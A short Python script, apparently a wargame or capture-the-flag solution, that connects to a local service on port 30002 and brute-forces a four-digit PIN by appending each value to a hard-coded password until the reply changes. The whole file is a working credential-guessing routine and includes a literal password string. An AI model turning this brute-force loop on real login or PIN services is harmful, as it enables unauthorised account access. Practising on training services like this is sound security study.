import socket                                                                            
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect (('localhost', 30002))
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
 
def pinCheck(s, password):
    count = 0 
    while count < 10000: 
        pin = password + " " + str(count).rjust(4, '0') + "\n"
        s.sendall(pin.encode())
        output = s.recv(2048)
        if "Wrong".encode() in output:
            pass
        else:
            print(output)
            s.close()
            exit(0)
        count += 1
 
hi = s.recv(2048)
print(hi)
 
pinCheck(s, password)
 
s.close()
